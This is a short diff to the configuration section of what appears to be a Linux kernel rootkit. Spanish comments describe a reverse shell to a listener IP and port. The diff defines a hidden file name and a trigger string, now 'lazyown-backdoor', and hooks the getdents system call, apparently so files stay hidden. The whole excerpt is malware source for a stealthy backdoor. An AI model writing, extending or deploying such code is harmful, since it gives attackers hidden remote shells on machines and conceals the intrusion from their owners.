@@ -27,8 +27,12 @@
 #define HIDDEN_FILE_NAME "grisun0"
 #define LISTENER_IP "10.10.14.10"  // IP del servidor al que se conectará la reverse shell
 #define LISTENER_PORT 3333  // Puerto del servidor al que se conectará la reverse shell
-#define SPECIAL_STRING "grisiscomebacksayknokknok"
+#ifndef SPECIAL_STRING
+#define SPECIAL_STRING "lazyown-backdoor"
+#endif
+#ifndef SPECIAL_STRING_PORT
 #define SPECIAL_STRING_PORT 4444  // Puerto para escuchar la cadena especial
+#endif
 
 // Original system call functions
 asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
